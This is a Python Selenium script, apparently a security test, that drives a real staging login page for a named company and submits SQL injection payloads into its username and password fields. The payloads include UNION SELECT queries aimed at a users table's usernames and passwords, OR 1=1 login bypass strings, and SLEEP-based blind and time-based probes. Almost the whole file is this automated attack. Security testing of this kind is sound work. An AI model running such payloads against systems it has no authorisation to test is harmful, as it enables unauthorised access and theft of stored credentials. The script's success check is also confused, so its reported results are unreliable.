from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException, TimeoutException, UnexpectedAlertPresentException

class SQLInjectionTest:
    def __init__(self):
        self.driver = webdriver.Chrome()
        self.wait = WebDriverWait(self.driver, 10)
        
    def open_login_page(self):
        self.driver.get("https://beats-stg.beraucoal.co.id/login")
    
    def handle_alert(self):
        try:
            alert = self.driver.switch_to.alert
            alert.accept()  # or alert.dismiss() depending on what you want to do
            print("Handled unexpected alert.")
        except NoAlertPresentException:
            print("No unexpected alert present.")
        except UnexpectedAlertPresentException:
            print("Unexpected alert present.")

    def reset_page(self):
        # Attempt to handle any alerts before refreshing the page
        self.handle_alert()
        try:
            self.driver.refresh()
            # Check and handle any alerts after refreshing
            self.handle_alert()
        except UnexpectedAlertPresentException:
            print("Unexpected alert present during page refresh.")

    def perform_test(self, username_payload, password_payload):
        self.open_login_page()
        self.reset_page()  # Ensure the page is in a clean state before starting the test
        
        try:
            username = self.wait.until(EC.presence_of_element_located((By.XPATH, '//input[@placeholder="BeatsID"]')))
            password = self.driver.find_element(By.XPATH, '//input[@placeholder="Password"]')
            
            username.send_keys(username_payload)
            password.send_keys(password_payload)
            
            login_button = self.driver.find_element(By.XPATH, '//div[@class="v-button v-widget friendly v-button-friendly v-has-width"]')
            login_button.click()
            
            # Handle unexpected alerts
            self.handle_alert()
            
            # Dynamic XPath based on username_payload
            error_message_xpath = f'//div[contains(@class, "v-label-isa_error") and contains(text(), "Akun {username_payload} Salah / Tidak Tersedia")]'
            
            # Check for error message dynamically
            try:
                error_message_element = self.wait.until(
                    EC.presence_of_element_located((By.XPATH, error_message_xpath))
                )
                print(f"SQL Injection test with payload '{password_payload}' succeeded. Error message contains: '{error_message_element.text}'")
            except TimeoutException:
                print(f"SQL Injection test with payload '{password_payload}' failed or unexpected result. Error message not found.")
        
        except Exception as e:
            print(f"Error during testing: {e}")
            self.handle_alert()  # Handle any alert that might pop up
    
    def test_union_based_sql_injection(self):
        self.perform_test("' UNION SELECT null, username, password FROM users -- ", "' UNION SELECT null, username, password FROM users -- ")

    def test_error_based_sql_injection(self):
        self.perform_test("' OR 1=1 -- ", "' OR 1=1 -- ")

    def test_blind_sql_injection(self):
        self.perform_test("' AND IF(1=1, SLEEP(5), 0) -- ", "' AND IF(1=1, SLEEP(5), 0) -- ")

    def test_time_based_sql_injection(self):
        self.perform_test("' OR IF(1=1, SLEEP(5), 0) -- ", "' OR IF(1=1, SLEEP(5), 0) -- ")

    def test_boolean_based_sql_injection(self):
        self.perform_test("' OR 1=1 -- ", "' OR 1=1 -- ")

    def close(self):
        self.driver.quit()

if __name__ == "__main__":
    test = SQLInjectionTest()
    
    test.test_union_based_sql_injection()
    test.test_error_based_sql_injection()
    test.test_blind_sql_injection()
    test.test_time_based_sql_injection()
    test.test_boolean_based_sql_injection()
    
    test.close()
